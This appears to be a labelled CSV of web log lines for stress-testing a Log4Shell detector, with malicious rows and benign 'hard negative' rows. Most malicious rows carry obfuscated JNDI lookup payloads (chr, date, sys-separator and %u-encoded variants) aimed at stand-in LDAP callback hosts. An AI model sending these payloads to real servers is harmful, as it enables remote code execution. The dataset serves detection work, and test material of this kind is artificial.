id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
OOD-900263,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.example.net%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900263,get /search?q=${jndi:ldap://probe.example.net/research}&intent=research http/1.1 trace_id=benign-ood-900263,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900197,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900034,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}"",""host"":""attacker.evil.com""}",1,log4shell,unsupported_lookup_namespace,json,ood_stress_test,critical
OOD-900189,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.evil.com%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://attacker.evil.com/research}&intent=research http/1.1,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900121,2026-05-17,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fpercent-u%u007D&request_id=ood-900121 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fpercent-u%u007d&request_id=ood-900121 http/1.1 host: victim.local,1,log4shell,iis_percent_u_encoding,query,ood_stress_test,critical
OOD-900169,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900066,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}"",""host"":""log4j-test.invalid""}",1,log4shell,charcode_lookup_reconstruction,json,ood_stress_test,critical
OOD-900091,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.91 | X-Api-Version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.91 | x-api-version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode},1,log4shell,charcode_lookup_reconstruction,header,ood_stress_test,critical
OOD-900182,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://attacker.evil.com separately; not a runtime lookup trace_id=benign-ood-900182,info tutorial says type ${ then jndi then :ldap://attacker.evil.com separately; not a runtime lookup trace_id=benign-ood-900182,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900096,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}; sid=ood900096,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}; sid=ood900096,1,log4shell,protocol_fragment_sys_lookup,cookie,ood_stress_test,critical
OOD-900142,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}"",""host"":""lab-callback.example.org""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}"",""host"":""lab-callback.example.org""}",1,log4shell,protocol_fragment_sys_lookup,json,ood_stress_test,critical
OOD-900039,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.39 | X-Api-Version: ${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://attacker.evil.com/date-fragment},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.39 | x-api-version: ${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://attacker.evil.com/date-fragment},1,log4shell,date_lookup_reconstruction,header,ood_stress_test,critical
OOD-900223,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900223,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900223,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900055,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.55 | X-Api-Version: ${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.55 | x-api-version: ${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator},1,log4shell,sys_lookup_separator,header,ood_stress_test,critical
OOD-900089,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}&request_id=ood-900089 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}&request_id=ood-900089 http/1.1 host: victim.local,1,log4shell,charcode_lookup_reconstruction,query,ood_stress_test,critical
OOD-900029,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}&request_id=ood-900029 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}&request_id=ood-900029 http/1.1 host: victim.local,1,log4shell,sys_lookup_separator,query,ood_stress_test,critical
OOD-900021,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}&request_id=ood-900021 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}&request_id=ood-900021 http/1.1 host: victim.local,1,log4shell,protocol_fragment_sys_lookup,query,ood_stress_test,critical
OOD-900262,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.example.net%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900262,get /search?q=${jndi:ldap://probe.example.net/research}&intent=research http/1.1 trace_id=benign-ood-900262,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900031,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.31 | X-Api-Version: ${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.31 | x-api-version: ${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator},1,log4shell,sys_lookup_separator,header,ood_stress_test,critical
OOD-900226,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://callback.local/not-executed}"" source=documentation trace_id=benign-ood-900226","info rendered json string value=""\\${jndi:ldap://callback.local/not-executed}"" source=documentation trace_id=benign-ood-900226",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900068,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}; sid=ood900068,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}; sid=ood900068,1,log4shell,charcode_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900217,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900287,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flab-callback.example.org%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900287,get /search?q=${jndi:ldap://lab-callback.example.org/research}&intent=research http/1.1 trace_id=benign-ood-900287,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900207,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup trace_id=benign-ood-900207,info tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup trace_id=benign-ood-900207,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900064,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://log4j-test.invalid/date-fragment}; sid=ood900064,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://log4j-test.invalid/date-fragment}; sid=ood900064,1,log4shell,date_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900023,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.23 | X-Api-Version: ${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.23 | x-api-version: ${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys},1,log4shell,protocol_fragment_sys_lookup,header,ood_stress_test,critical
OOD-900279,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup trace_id=benign-ood-900279,info tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup trace_id=benign-ood-900279,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900110,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://probe.example.net/date-fragment}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://probe.example.net/date-fragment}"",""host"":""probe.example.net""}",1,log4shell,date_lookup_reconstruction,json,ood_stress_test,critical
OOD-900198,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900198,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900198,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900008,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}; sid=ood900008,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}; sid=ood900008,1,log4shell,sys_lookup_separator,cookie,ood_stress_test,critical
OOD-900063,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.63 | X-Api-Version: ${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://log4j-test.invalid/date-fragment},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.63 | x-api-version: ${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://log4j-test.invalid/date-fragment},1,log4shell,date_lookup_reconstruction,header,ood_stress_test,critical
OOD-900115,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.115 | X-Api-Version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.115 | x-api-version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode},1,log4shell,charcode_lookup_reconstruction,header,ood_stress_test,critical
OOD-900123,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.123 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.123 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fpercent-u%u007d,1,log4shell,iis_percent_u_encoding,header,ood_stress_test,critical
OOD-900109,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://probe.example.net/date-fragment}&request_id=ood-900109 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://probe.example.net/date-fragment}&request_id=ood-900109 http/1.1 host: victim.local,1,log4shell,date_lookup_reconstruction,query,ood_stress_test,critical
OOD-900061,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://log4j-test.invalid/date-fragment}&request_id=ood-900061 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://log4j-test.invalid/date-fragment}&request_id=ood-900061 http/1.1 host: victim.local,1,log4shell,date_lookup_reconstruction,query,ood_stress_test,critical
OOD-900007,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.7 | X-Api-Version: ${j${sys:line.separator}ndi:ldap://evil.example/sys-separator},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.7 | x-api-version: ${j${sys:line.separator}ndi:ldap://evil.example/sys-separator},1,log4shell,sys_lookup_separator,header,ood_stress_test,critical
OOD-900144,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}; sid=ood900144,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}; sid=ood900144,1,log4shell,protocol_fragment_sys_lookup,cookie,ood_stress_test,critical
OOD-900205,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup,info tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900149,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900228,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://callback.local/not-executed}"" source=documentation trace_id=benign-ood-900228","info rendered json string value=""\\${jndi:ldap://callback.local/not-executed}"" source=documentation trace_id=benign-ood-900228",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900247,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900247,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900247,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900195,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900195,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900195,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900095,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.95 | X-Api-Version: ${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.95 | x-api-version: ${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys},1,log4shell,protocol_fragment_sys_lookup,header,ood_stress_test,critical
OOD-900148,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900148,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900148,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900113,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}&request_id=ood-900113 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}&request_id=ood-900113 http/1.1 host: victim.local,1,log4shell,charcode_lookup_reconstruction,query,ood_stress_test,critical
OOD-900285,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flab-callback.example.org%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://lab-callback.example.org/research}&intent=research http/1.1,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900054,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}"",""host"":""log4j-test.invalid""}",1,log4shell,sys_lookup_separator,json,ood_stress_test,critical
OOD-900255,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup trace_id=benign-ood-900255,info tutorial says type ${ then jndi then :ldap://probe.example.net separately; not a runtime lookup trace_id=benign-ood-900255,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900284,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://lab-callback.example.org/fixture}' assertion=string_literal_only trace_id=benign-ood-900284,warn unit-test fixture expected='${jndi:ldap://lab-callback.example.org/fixture}' assertion=string_literal_only trace_id=benign-ood-900284,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900098,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fpercent-u%u007D"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fpercent-u%u007d"",""host"":""probe.example.net""}",1,log4shell,iis_percent_u_encoding,json,ood_stress_test,critical
OOD-900155,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://evil.example/not-executed}"" source=documentation trace_id=benign-ood-900155","info rendered json string value=""\\${jndi:ldap://evil.example/not-executed}"" source=documentation trace_id=benign-ood-900155",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900049,2026-05-17,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fpercent-u%u007D&request_id=ood-900049 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fpercent-u%u007d&request_id=ood-900049 http/1.1 host: victim.local,1,log4shell,iis_percent_u_encoding,query,ood_stress_test,critical
OOD-900154,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://evil.example/not-executed}"" source=documentation trace_id=benign-ood-900154","info rendered json string value=""\\${jndi:ldap://evil.example/not-executed}"" source=documentation trace_id=benign-ood-900154",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900084,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}; sid=ood900084,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}; sid=ood900084,1,log4shell,unsupported_lookup_namespace,cookie,ood_stress_test,critical
OOD-900171,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900171,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900171,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900257,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only,warn unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900160,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://evil.example separately; not a runtime lookup trace_id=benign-ood-900160,info tutorial says type ${ then jndi then :ldap://evil.example separately; not a runtime lookup trace_id=benign-ood-900160,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900032,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}; sid=ood900032,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}; sid=ood900032,1,log4shell,sys_lookup_separator,cookie,ood_stress_test,critical
OOD-900184,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://attacker.evil.com separately; not a runtime lookup trace_id=benign-ood-900184,info tutorial says type ${ then jndi then :ldap://attacker.evil.com separately; not a runtime lookup trace_id=benign-ood-900184,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900019,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.19 | X-Api-Version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.19 | x-api-version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode},1,log4shell,charcode_lookup_reconstruction,header,ood_stress_test,critical
OOD-900028,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fpercent-u%u007D; sid=ood900028,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fpercent-u%u007d; sid=ood900028,1,log4shell,iis_percent_u_encoding,cookie,ood_stress_test,critical
OOD-900152,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900152,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900152,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900075,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.75 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.75 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fpercent-u%u007d,1,log4shell,iis_percent_u_encoding,header,ood_stress_test,critical
OOD-900230,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup trace_id=benign-ood-900230,info tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup trace_id=benign-ood-900230,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900094,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}"",""host"":""callback.local""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}"",""host"":""callback.local""}",1,log4shell,protocol_fragment_sys_lookup,json,ood_stress_test,critical
OOD-900099,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.99 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.99 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fpercent-u%u007d,1,log4shell,iis_percent_u_encoding,header,ood_stress_test,critical
